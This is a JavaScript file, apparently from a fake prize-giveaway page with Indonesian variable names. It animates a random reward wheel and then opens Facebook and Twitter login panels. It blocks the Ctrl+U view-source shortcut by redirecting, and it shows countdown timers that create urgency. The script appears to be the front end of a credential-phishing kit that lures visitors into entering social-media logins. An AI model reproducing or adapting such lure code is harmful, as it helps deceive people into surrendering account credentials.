var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

	const hadiah = {
    0: 'img/reward/1.png',
    1: 'img/reward/2.png',
    2: 'img/reward/3.png',
    3: 'img/reward/4.png',
    4: 'img/reward/5.png',
    5: 'img/reward/6.png',
    6: 'img/reward/7.png',
    7: 'img/reward/8.png',
    8: 'img/reward/9.png',
    9: 'img/reward/10.png',
};

const jumlah_kado = 10;
const ngaclog = 15; 
let shagitz = -1;
let loncat = 0;
let kecepatan = 20;
let waktu = 0;
let hadiahnya = -1;

function runCircle() {
    $(`[shagitzsan="${shagitz}"]`).removeClass('kurung');

    shagitz += 1;

    if (shagitz > jumlah_kado - 1) {
        shagitz = 0;
    }

    $(`[shagitzsan="${shagitz}"]`).addClass('kurung');
}

function generatePrizeNumber() {
    return Math.floor(Math.random() * jumlah_kado);
}

function controllSpeed() {
    loncat += 1;
    runCircle();
    if (loncat > ngaclog + 10 && hadiahnya === shagitz) {
        clearTimeout(waktu);
        
        $('#got').show('bounce');
        $('#gambarnya').attr('src',hadiah[shagitz]);

        hadiahnya = -1;
        loncat = 0;

    } else {
        if (loncat < ngaclog) {
            kecepatan -= 2; 
        } else if (loncat === ngaclog) {
            const acaknomor = generatePrizeNumber();
            hadiahnya = acaknomor;
        } else {
           
            if ( (loncat > ngaclog + 10) && hadiahnya === (shagitz + 1) ) {
                kecepatan += 400;
            } else {
                kecepatan += 20; 
            }
        }
        if (kecepatan < 18) {
            kecepatan = 18;
        }

        waktu = setTimeout(controllSpeed, kecepatan);
    }
}

function gaskeun() {
    document.getElementsByTagName("audio")[0].play();
    loncat = 0;
    kecepatan = 50;
    hadiahnya = -1;
    controllSpeed();
    document.getElementById("uy").disabled = true;
}


function account_login1() {
$('#account_login').show();
$('#got').hide();
}
function account_login2() {
$('#account_login').show();
$('#get').hide();
}
function tutup_account_login() {
$('#get_gift').show();
$('#account_login').hide();
}
function open_help(){
    $('#help').show();
}
function open_logout(){
    $('#logout').show();
}
function open_facebook(){
    $('.facebook').show();
    $('#account_login').hide();
}
function open_twitter(){
    $('.twitter').show();
    $('#account_login').hide();
}

function close_help(){
    $('#help').hide();
}
function close_share(){
    $('#share').hide();
}
function open_share(){
    $('#share').fadeIn();
}
function close_logout(){
    $('#logout').hide();
}
function close_facebook(){
    $('.facebook').hide();
    $('#account_login').show();
}
function close_twitter(){
    $('.twitter').hide();
    $('#account_login').show();
}

//<![CDATA[
function redirectCU(e) {
  if (e.ctrlKey && e.which == 85) {
    window.location.replace("What_Do_You_Want");
    return false;
  }
}
document.onkeydown = redirectCU;
//]]>

var countDownDate = new Date("Dec 16, 2020 07:00:00").getTime();
var x = setInterval(function() {
  var now = new Date().getTime();
  var distance = countDownDate - now;
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
  document.getElementById("waktu").innerHTML = days + "d " + hours + "h ";
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("waktu").innerHTML = "EXPIRED";
  }
}, 1000);


var countDownDateb = new Date("Dec 16, 2020 07:00:00").getTime();
var xb = setInterval(function() {
  var nowb = new Date().getTime();
  var distanceb = countDownDateb - nowb;
  var daysb = Math.floor(distanceb / (1000 * 60 * 60 * 24));
  var hoursb = Math.floor((distanceb % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutesb = Math.floor((distanceb % (1000 * 60 * 60)) / (1000 * 60));
  var secondsb = Math.floor((distanceb % (1000 * 60)) / 1000);
  document.getElementById("waktub").innerHTML = daysb + "D " + hoursb + "H "
  + minutesb + "M " + secondsb + "S ";
  if (distanceb < 0) {
    clearInterval(xb);
    document.getElementById("waktub").innerHTML = "EXPIRED";
  }
}, 1000);